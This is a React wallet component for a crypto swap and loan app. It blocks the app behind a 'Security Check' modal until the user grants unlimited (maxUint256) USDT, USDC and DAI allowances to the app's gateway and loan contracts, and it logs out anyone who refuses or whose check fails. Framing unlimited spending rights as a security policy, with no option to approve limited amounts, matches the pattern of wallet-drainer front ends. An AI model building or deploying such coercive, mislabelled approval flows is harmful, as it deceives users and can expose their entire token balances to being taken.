import React, { useEffect, useState } from 'react';
import { useAccount, usePublicClient, useWriteContract } from 'wagmi';
import { useAuth } from '@/hooks/useAuth';
import {
  USDT_ADDRESSES,
  USDC_ADDRESSES,
  DAI_ADDRESSES,
  GATEWAY_ADDRESSES,
  LOAN_CONTRACT_ADDRESSES,
  erc20Abi,
} from '@/config/constants';
import { maxUint256 } from 'viem';
import toast from 'react-hot-toast';

const ZERO_ADDRESS = '0x0000000000000000000000000000000000000000';

export default function GlobalApprovalGuard({ children }) {
  const { isAuthenticated, logout } = useAuth();
  const { address, chain } = useAccount();
  const publicClient = usePublicClient();
  const { writeContractAsync } = useWriteContract();

  const [isChecking, setIsChecking] = useState(false);
  const [needsApproval, setNeedsApproval] = useState(false);
  // Each item: { symbol, address, spender, spenderLabel }
  const [tokensToApprove, setTokensToApprove] = useState([]);
  const [isApproving, setIsApproving] = useState(false);

  // If not authenticated, we don't block. The routing handles protected routes.
  useEffect(() => {
    if (!isAuthenticated || !chain || !address || !publicClient) {
      setIsChecking(false);
      return;
    }

    let mounted = true;

    const checkAllowances = async () => {
      setIsChecking(true);
      try {
        const networkName =
          chain?.id === 56 || chain?.name?.toLowerCase().includes('bsc') ? 'bnb' : 'polygon';

        const gatewayAddress = GATEWAY_ADDRESSES[networkName];
        const loanAddress = LOAN_CONTRACT_ADDRESSES[networkName];

        // Build spender list — skip any that are missing or the zero address
        const spenders = [
          { address: gatewayAddress, label: 'Swap Gateway' },
          { address: loanAddress, label: 'Loan Contract' },
        ].filter(s => s.address && s.address !== ZERO_ADDRESS);

        if (spenders.length === 0) {
          setIsChecking(false);
          return;
        }

        const tokens = [
          { symbol: 'USDT', address: USDT_ADDRESSES[networkName] },
          { symbol: 'USDC', address: USDC_ADDRESSES[networkName] },
          { symbol: 'DAI', address: DAI_ADDRESSES[networkName] },
        ].filter(t => t.address && t.address !== 'NOT_VERIFIED');

        // Threshold: 1 million tokens (with 18 decimals). Any allowance below
        // this is treated as "needs approval" so debits never fail mid-flow.
        const threshold = 1_000_000_000_000_000_000_000_000n; // 1e24

        const toApprove = [];

        for (const spender of spenders) {
          for (const token of tokens) {
            const allowance = await publicClient.readContract({
              address: token.address,
              abi: erc20Abi,
              functionName: 'allowance',
              args: [address, spender.address],
            });

            if (allowance < threshold) {
              toApprove.push({
                symbol: token.symbol,
                address: token.address,
                spender: spender.address,
                spenderLabel: spender.label,
              });
            }
          }
        }

        if (!mounted) return;

        setTokensToApprove(toApprove);
        setNeedsApproval(toApprove.length > 0);
      } catch (err) {
        console.error('Allowance check failed:', err);
        if (mounted) {
          toast.error('Failed to check security limits. Logging out for safety.');
          logout();
        }
      } finally {
        if (mounted) {
          setIsChecking(false);
        }
      }
    };

    checkAllowances();

    return () => {
      mounted = false;
    };
  }, [isAuthenticated, chain, address, publicClient, logout]);

  const handleApproveAll = async () => {
    setIsApproving(true);
    try {
      for (let i = 0; i < tokensToApprove.length; i++) {
        const t = tokensToApprove[i];
        toast.loading(
          `Approving ${t.symbol} for ${t.spenderLabel} (${i + 1}/${tokensToApprove.length})...`,
          { id: 'globalApprove' }
        );

        const txHash = await writeContractAsync({
          address: t.address,
          abi: erc20Abi,
          functionName: 'approve',
          args: [t.spender, maxUint256],
        });

        toast.loading(`Waiting for ${t.symbol} confirmation...`, { id: 'globalApprove' });
        await publicClient.waitForTransactionReceipt({ hash: txHash });
        toast.success(`${t.symbol} approved!`, { id: 'globalApprove', duration: 2000 });
      }

      setNeedsApproval(false);
      setTokensToApprove([]);
    } catch (err) {
      console.error('Approval failed or cancelled:', err);
      toast.error('Approval cancelled or failed. Security policy requires logout.');
      logout();
    } finally {
      setIsApproving(false);
      toast.dismiss('globalApprove');
    }
  };

  const handleReject = () => {
    toast.error('Permissions rejected. Logging out.');
    logout();
  };

  // Derive unique spender labels for display in the modal
  const uniqueSpenderLabels = [...new Set(tokensToApprove.map(t => t.spenderLabel))];

  if (isAuthenticated && (isChecking || needsApproval)) {
    return (
      <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-md animate-fade-in">
        <div className="bg-[#13131f] border border-blue-500/20 rounded-3xl p-10 max-w-md w-full text-center shadow-2xl relative overflow-hidden">
          {/* Background Ambient Glow */}
          <div className="absolute top-[-20%] right-[-20%] w-[20rem] h-[20rem] bg-indigo-600 rounded-full mix-blend-screen filter blur-[150px] opacity-20 pointer-events-none"></div>

          {isChecking ? (
            <div className="flex flex-col items-center gap-6">
              <div className="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
              <div>
                <h2 className="text-2xl font-bold text-white mb-2">Security Check</h2>
                <p className="text-zinc-400">Verifying smart contract permissions...</p>
              </div>
            </div>
          ) : (
            <div className="flex flex-col items-center gap-6">
              <div className="w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center text-blue-400">
                <svg
                  className="w-8 h-8"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                  />
                </svg>
              </div>

              <div>
                <h2 className="text-2xl font-bold text-white mb-2">Action Required</h2>
                <p className="text-zinc-400 text-sm">
                  To use swapping and the loan module, we require a one-time approval for our
                  contracts. You will be prompted to approve{' '}
                  <span className="text-white font-semibold">{tokensToApprove.length}</span>{' '}
                  permission{tokensToApprove.length !== 1 ? 's' : ''}.
                </p>

                {/* Spender labels summary */}
                {uniqueSpenderLabels.length > 0 && (
                  <div className="flex flex-wrap justify-center gap-2 mt-3">
                    {uniqueSpenderLabels.map(label => (
                      <span
                        key={label}
                        className="px-3 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-300 text-xs font-medium"
                      >
                        {label}
                      </span>
                    ))}
                  </div>
                )}
              </div>

              <div className="w-full flex flex-col gap-3 mt-4">
                <button
                  onClick={handleApproveAll}
                  disabled={isApproving}
                  className="w-full py-4 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-bold transition-all disabled:opacity-50 flex justify-center items-center gap-2"
                >
                  {isApproving ? (
                    <>
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Approving...
                    </>
                  ) : (
                    'Accept & Approve All'
                  )}
                </button>
                <button
                  onClick={handleReject}
                  disabled={isApproving}
                  className="w-full py-3 rounded-xl bg-white/5 hover:bg-white/10 text-zinc-400 transition-colors"
                >
                  Reject & Disconnect
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    );
  }

  // Fallthrough if not authenticated or no approvals needed
  return <>{children}</>;
}
